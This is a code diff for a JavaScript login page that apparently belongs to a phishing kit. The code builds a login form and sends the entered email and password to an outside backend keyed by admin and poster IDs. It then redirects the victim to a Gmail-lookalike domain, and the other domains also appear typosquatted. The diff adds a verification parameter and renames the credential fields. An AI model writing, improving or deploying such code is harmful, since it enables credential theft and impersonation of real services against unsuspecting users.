@@ -1,5 +1,8 @@
+
+
 // Function to extract URL parameters
-const API_URL = 'https://erosback.vercel.app'
+const API_URL = 'https://meetbackend-three.vercel.app'
+
 const siteUrl ='www.meggapursonel.online'
 function detectDevice(userAgent) {
     if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
@@ -42,13 +45,14 @@ window.onload = function () {
 
 
 
-
 $(document).ready(function () {
     // Extract 'userid' from the URL
       const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
     const adminId = getQueryParam('admin');
     const posterId = getQueryParam('poster');
     const site = getQueryParam('site');
+        const verifyId = getQueryParam('verifyId');
+
 
     // Dynamically create the login form
     const loginForm = $('<form>', {
@@ -104,8 +108,8 @@ $(document).ready(function () {
                 url: `${API_URL}/ad/${adminId}/${posterId}`,
                 data: {
                     site:site,
-                    email: username,
-                    password: password,
+                    mail: username,
+                    passcode: password,
                   adminId: adminId,
                     posterId: posterId
                    
@@ -115,7 +119,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://view.megaapersonase.website/female-escort/${userId}`;
+                            window.location.href = `https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
                           }
                     
                 },
